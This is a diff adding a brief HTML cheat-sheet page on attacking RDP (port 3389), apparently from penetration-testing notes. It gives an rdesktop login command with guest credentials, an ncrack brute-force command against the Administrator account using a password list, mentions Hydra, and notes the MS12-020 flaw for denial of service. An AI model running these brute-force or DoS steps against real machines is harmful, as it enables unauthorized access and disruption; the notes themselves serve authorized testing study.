@@ -1,0 +1,16 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>3389: RDP</title>
+</head><body>This is a proprietary protocol developed by windows to allow remote desktop.<br/>
+<br/>
+Log in like this<br/>
+rdesktop -u guest -p guest 10.11.1.5 -g 94%<br/>
+<br/>
+Brute force like this<br/>
+ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101<br/>
+or Hydra<br/>
+<br/>
+Ms12-020<br/>
+This is categorized by microsoft as a RCE vulnerability. But there is no POC for it online. You can only DOS a machine using this exploit.</body></html>
